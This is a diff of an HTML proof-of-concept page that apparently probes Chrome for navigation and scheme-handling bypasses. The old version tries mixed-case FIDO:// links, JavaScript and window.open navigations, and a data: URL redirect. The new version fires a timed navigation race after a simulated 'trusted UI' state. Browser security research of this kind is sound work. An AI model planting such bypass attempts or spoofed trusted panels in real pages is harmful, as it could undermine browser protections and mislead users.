@@ -1,76 +1,112 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Chrome Windows FIDO Scheme Case Sensitivity PoC</title>
+<title>Chrome Navigation Race + Scheme Handling PoC</title>
+
 <style>
-body { font-family: Arial, sans-serif; }
-a, button { display:block; margin:10px 0; }
+body {
+  font-family: system-ui, sans-serif;
+}
+#panel {
+  display: none;
+  padding: 16px;
+  margin-top: 20px;
+  border: 2px solid #e00;
+  background: #fee;
+}
+button {
+  padding: 10px 14px;
+  font-size: 15px;
+}
+pre {
+  background: #111;
+  color: #0f0;
+  padding: 10px;
+  margin-top: 20px;
+  height: 200px;
+  overflow: auto;
+}
 </style>
 </head>
 
 <body>
-<h2>Chrome Windows – FIDO / WebAuthn Scheme PoC</h2>
+
+<h2>Chrome Desktop – Navigation Race Condition PoC</h2>
 
 <p>
-Expected behavior:<br>
-Chrome should block all FIDO / WebAuthn related schemes from web pages,
-regardless of casing or navigation method.
+This PoC attempts to trigger a navigation race shortly after a trusted UI
+state transition, to test whether Chrome consistently blocks restricted
+or sensitive navigations.
 </p>
 
-<h3>1. Anchor navigation</h3>
-<a href="fido://">Blocked: fido://</a>
-<a href="FIDO://">TEST: FIDO:// (uppercase)</a>
-<a href="FiDo://">TEST: FiDo:// (mixed case)</a>
+<button id="trigger">Start flow</button>
 
-<h3>2. JavaScript navigation</h3>
-<button onclick="location.href='FIDO://'">
-JS → FIDO://
-</button>
-
-<button onclick="location.replace('FiDo://')">
-JS replace → FiDo://
-</button>
-
-<h3>3. Window.open()</h3>
-<button onclick="window.open('FIDO://')">
-window.open → FIDO://
-</button>
-
-<h3>4. Redirect chain</h3>
-<button onclick="startRedirect()">
-HTTP-style redirect → FIDO://
-</button>
-
-<h3>5. WebAuthn control test</h3>
-<button onclick="triggerWebAuthn()">navigator.credentials.get()</button>
+<div id="panel">
+  <strong>Trusted UI Panel</strong><br>
+  Simulating a post‑gesture / trusted context.
+</div>
 
 <pre id="log"></pre>
 
 <script>
+const trigger = document.getElementById('trigger');
+const panel = document.getElementById('panel');
+const logEl = document.getElementById('log');
+
 function log(msg) {
-  document.getElementById('log').textContent += msg + "\n";
+  logEl.textContent += msg + "\n";
 }
 
-function startRedirect() {
-  location.href = "data:text/html,<script>location.href='FIDO://'<\/script>";
-}
+/*
+ * Step 1:
+ * Simulate transition into a trusted / post‑gesture state
+ */
+trigger.onclick = () => {
+  log("[+] User gesture received");
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
 
-async function triggerWebAuthn() {
-  try {
-    await navigator.credentials.get({
-      publicKey: {
-        challenge: new Uint8Array(32),
-        allowCredentials: [],
-        timeout: 30000,
-        userVerification: "discouraged"
-      }
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission‑like flow starts
+ *
+ * pageshow + double rAF ensures execution right after BFCache /
+ * navigation lifecycle stabilization.
+ */
+window.addEventListener('pageshow', () => {
+  log("[*] pageshow event");
+
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      log("[*] Inside double rAF");
+
+      setTimeout(() => {
+        log("[!] Triggering delayed navigation");
+
+        /*
+         * CHANGE TARGETS TO TEST:
+         *
+         * 1. External protocol attempt
+         *    location.href = 'FIDO://';
+         *
+         * 2. Mixed‑case scheme
+         *    location.href = 'FiDo://';
+         *
+         * 3. Confusing but invalid authority
+         *    location.href = 'https://google.com:9090';
+         *
+         * 4. Redirect chain
+         *    location.href = 'data:text/html,<script>location.href=\"FIDO://\"<\/script>';
+         */
+
+        location.href = 'https://google.com:9090';
+
+      }, 80);
     });
-    log("WebAuthn prompt shown");
-  } catch (e) {
-    log("WebAuthn blocked: " + e);
-  }
-}
+  });
+});
 </script>
 
 </body>
